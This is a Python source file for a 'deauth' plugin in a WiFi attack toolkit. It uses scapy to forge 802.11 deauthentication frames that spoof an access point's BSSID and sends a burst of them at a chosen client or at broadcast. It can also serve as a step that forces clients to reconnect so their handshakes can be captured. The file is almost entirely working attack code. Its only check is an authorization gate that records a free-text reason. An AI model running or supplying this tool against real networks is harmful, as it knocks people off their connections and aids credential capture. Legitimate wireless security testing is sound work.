"""Deauth plugin — risk=high.

Forges 802.11 deauthentication frames with the AP's BSSID spoofed in the
source. Used directly (CLI subcommand) or as a child of HandshakePlugin to
provoke a client reconnect.
"""

from __future__ import annotations

import time
from typing import Any

import click

from cyberm4fia_wifi.core.auth import AuthorizationGate, PluginRisk
from cyberm4fia_wifi.core.events import DeauthSent, EventBus
from cyberm4fia_wifi.plugins.base import Plugin, PluginContext

_BROADCAST = "ff:ff:ff:ff:ff:ff"


def _build_frame(*, src_bssid: str, dst: str) -> Any:
    """Construct one RadioTap+Dot11 deauth frame. Reason 7 = class-3 frame."""
    import scapy.all as s  # noqa: PLC0415

    return s.RadioTap() / s.Dot11(
        type=0, subtype=12,
        addr1=dst,
        addr2=src_bssid,
        addr3=src_bssid,
    ) / s.Dot11Deauth(reason=7)


class DeauthPlugin(Plugin):
    name = "deauth"
    risk = PluginRisk.HIGH
    requires_injection = True

    def register_cli(self, group: click.Group) -> None:
        @group.command(name=self.name, help="Send a burst of deauth frames (risk=high)")
        @click.option("--target", "-t", required=True, help="AP BSSID to spoof")
        @click.option(
            "--client", "-c", required=True,
            help="Target STA MAC or 'broadcast'",
        )
        @click.option("--count", "-n", default=8, show_default=True, type=int)
        @click.option(
            "--reason", "-r", "--i-am-authorized-to-do-this",
            "reason", required=True,
            help="Authorization reason, recorded verbatim in the audit log",
        )
        @click.pass_context
        def deauth_cmd(
            ctx: click.Context,
            target: str,
            client: str,
            count: int,
            reason: str,
        ) -> None:
            from cyberm4fia_wifi.cli import build_runtime_for  # noqa: PLC0415

            runtime = build_runtime_for(ctx)
            target_station = (
                None if client.lower() in ("broadcast", "ff:ff:ff:ff:ff:ff") else client
            )
            rc = self.execute(
                bus=runtime.bus,
                gate=runtime.gate,
                iface=runtime.adapter.iface,
                target_bssid=target,
                target_station=target_station,
                count=count,
                reason=reason,
            )
            ctx.exit(rc)

    def execute(
        self,
        *,
        bus: EventBus,
        gate: AuthorizationGate,
        iface: str,
        target_bssid: str,
        target_station: str | None,
        count: int = 8,
        reason: str = "",
    ) -> int:
        gate.check(plugin=self.name, risk=self.risk, target=target_bssid, reason=reason)

        import scapy.all as s  # noqa: PLC0415

        dst = (target_station or _BROADCAST).lower()
        src = target_bssid.lower()

        for i in range(1, count + 1):
            frame = _build_frame(src_bssid=src, dst=dst)
            s.sendp(frame, iface=iface, verbose=False)
            bus.publish(
                DeauthSent(
                    timestamp=time.time(),
                    target_bssid=src,
                    target_station=target_station,
                    sequence=i,
                    total=count,
                )
            )
        return 0

    def run(self, ctx: PluginContext) -> int:  # pragma: no cover — CLI uses execute()
        raise NotImplementedError("call DeauthPlugin.execute(...) directly")
